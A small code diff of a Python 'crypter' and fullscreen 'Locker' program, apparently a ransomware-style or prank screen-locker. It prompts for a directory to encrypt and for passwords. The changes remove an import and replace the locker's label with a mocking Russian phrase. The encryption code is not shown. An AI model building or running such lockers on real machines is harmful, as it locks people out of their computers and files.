@@ -1,5 +1,3 @@
-import os
-
 direct = input("Write the root directory for crypt: ")
 crypt_pass = input("Write the password for crypter: ")
 locker_pass = input("Write the password for locker: ")
@@ -36,7 +34,7 @@ def locker():
 	root.title("Locker")
 	root.attributes("-fullscreen",True)
 	entry = Entry(root,font=1)
-	label0=Label(root,text="Locker_by_#571",font=1)
+	label0=Label(root,text="КтО-тО ЧаЙнИк",font=1)
 	label0.grid(row=0,column=0)
 	label1=Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20')
 	label1.place(x=470,y=300)
